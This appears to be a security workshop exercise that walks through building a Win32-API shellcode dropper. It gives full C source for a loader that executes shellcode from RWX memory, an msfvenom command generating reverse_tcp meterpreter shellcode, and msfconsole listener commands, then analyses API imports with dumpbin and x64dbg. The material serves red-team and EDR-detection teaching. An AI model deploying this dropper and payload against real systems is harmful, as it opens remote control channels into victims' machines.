## Exercise 2: Win32 Dropper
In **Exercise 2** we will create our first shellcode dropper based on **high level APIs** or **Win32 APIs**. This dropper will more or less be the reference for further development into a direct syscall and indirect syscall dropper. Later in this text we call the Dropper Win32-Dropper. If you look at the figure below, you will see that we do not use direct or indirect syscalls at all. Instead we use the normal legitimate way like ``malware.exe`` -> ``Win32 APIs (kernel32.dll)`` -> ``Native APIs (ntdll.dll)`` -> ``syscall``.  
![_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235367776-54229a66-f1d6-4b8e-a2a2-7bb81fecbf48.png)


## Exercise 2 tasks:
1. Download the Win32-Dropper POC from the Code section of this chapter.
2. In this case the code is already implemented in the POC. Your task is to create x64 meterpreter shellcode, copy it into the POC and compile it.
3. Create and run a staged x64 meterpreter listener using msfconsole.
4. Run your compiled .exe and check that a stable command and control channel opens. 
5. Use the Visual Studio **dumpbin** tool to analyse the Win32-Dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
6. Use **x64dbg** to debug or analyse the Win32-Dropper. 
     - Check which Win32 APIs and native APIs are being imported. If they are being imported, from which module or memory location are they being imported? Is the result what you expected?
     - Check from which module or memory location the syscalls for the four APIs used are being executed. Is the result what you expected?


## Visual Studio
You can download the POC from the code section of this chapter. The technical functionality of the Win32-Dropper is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the Win32-Dropper into a Low-Level-Dropper using direct system calls. In the Win32-Dropper we use the following Win32 APIs 
- VirtualAlloc
- WriteProcessMemory
- CreateThread
- WaitForSingleObject

The code works like this. First, we need to define the thread function for shellcode execution later in the code.
<details>
    
```
// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}
```
 </details> 
 

Within the main function, the variable **code** is defined, which is responsible for storing the meterpreter shellcode. The content of "code" is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.
<details>
    
```
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
</details>

    
The next code block defines the function pointer **void***, which points to the variable **exec** and stores the return address of the allocated memory using the Windows API VirtualAlloc.
<details>
    
```
// Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
 </details>   


The meterpreter shellcode is then copied to the allocated memory using the Windows API **WriteProcessMemory**.
<details>

```
// Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
```
</details>
    

Next, the Windows API **CreateThread** is used to execute the meterpreter shellcode. This is done by creating a new thread.<p align="center">
<details>
    
```
// Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL); 
```
</details>

    
And by using the Windows API **WaitForSingleObject** we need to make sure that the shellcode thread completes its execution before the main thread exits.
<details>  
    
```
// Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);    
```
</details>    

    
Here is the **complete code**, but you can also find it already implemented in the code POC of this chapter.
<details>
    
```
#include <stdio.h>
#include <windows.h>

// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}

int main() {
    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);

    // Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);

    // Return 0 as the main function exit code
    return 0;
}
```
</details>

    
## Meterpreter Shellcode
In this step, we will create our meterpreter shellcode for the Win32-Dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
**kali>**       
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>
    
The shellcode can then be copied into the Win32-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
<p align="center">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>
    

## MSF-Listener
Before we test the functionality of our Win32-Dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 
<details>
    
<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>


## Win32-Dropper analysis: dumpbin
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
<details>
    
**cmd>**  
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports high_level.exe
```
</details>
    
<details>
    <summary>Solution</summary>   
In the case of the Win32-Dropper, you should see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are correctly imported into the Win32-Dropper from the kernel32.dll.
<p align="center">
<img width="693" alt="image" src="https://user-images.githubusercontent.com/50073731/235369396-dbad1178-e9a2-4c55-8c6a-fdc9362d864c.png">
</p>
</details>

    
## Win32-Dropper analysis: x64dbg
The first step is to run your Win32-Dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
Then we open x64dbg and attach to the running process, note that if you open the Win32-Dropper directly in x64dbg you need to run the assembly first.
<details>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
</p>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/1d7959d0-9a35-451d-be18-826f4a832737">
</p>            
</details>    


First we want to check which APIs (Win32 or Native) or if the correct APIs are being imported and from which module or memory location. 
Remember that no direct syscalls or similar are used in the Win32-Dropper. What results do you expect?
     
<details>
    <summary>Solution</summary>
Checking the imported symbols in our Win32-Dropper, we should see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are imported from kernel32.dll. So the result is the same as with dumpbin and seems to be valid.     
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/93836da7-aaf0-412d-8871-6cea88b00d83">   
<img width="800" alt="image" src="[https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/93836da7-aaf0-412d-8871-6cea88b00d83](https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/facd43e5-6cb6-44b7-b17b-0dfd8faab28a)">
</p>        
We use the "Follow imported address" function in the Symbols tab by right-clicking on one of the four Win32 APIs used, e.g. Virtual Alloc, and we can see that we jump to the location of kernel32.dll.
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/55b64891-6e31-4f1b-b566-30489fb41c7b">
</p>
In the next step we use the function Follow in Dissassembler to follow the memory address that jumps to the memory of the kernelbase.dll.  
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/fa540f58-b748-45c7-9ee0-4f55821709f7">
</p> 
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/992e3162-84cc-480b-ade9-e17d6541ba48">
</p>
Then we use the Follow in dissassembler function again and follow the address that calls the native function Nt* or ZwAllocateVirtualMemory from a memory location in ntdll.dll      
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/667441cb-d9ae-43d3-969e-35be8dbab5da">
</p>        
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/456e8c76-32bc-4115-8154-61630a8e87c5">
</p>
As expected, we go the normal way via ``malware.exe`` -> ``kernel32.dll`` -> ``kernelbase.dll`` -> ``ntdll.dll`` -> ``syscall``.     
</details>     

We also want to check from which module or memory location the syscall stub of the native functions used is implemented, and also check from which module or memory location the syscall statement and return statement are executed.
<details>
    <summary>Solution</summary>
     The following illustration shows, that the syscall instruction and the return instruction are executed from a memory region in ntdll.dll as expected.          
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/0701e142-1dd8-4a18-91f8-bf32d6b66315">          
</p>            
</details>     


   
## Summary: Win32-Dropper
- No direct system calls at all
- Syscall execution via normal transition from high_level_dropper.exe -> kernel32.dll -> ntdll.dll -> syscall
- Win32-Dropper imports Windows APIs from kernel32.dll...
- ...then accesses or imports the native functions from ntdll.dll...
- ...and finally executes the code of the corresponding native function, including the syscall instruction.  
- If an EDR uses user mode hooking in kernel32.dll or ntdll.dll, the contents of malware.exe are redirected to the EDR's hooking.dll.

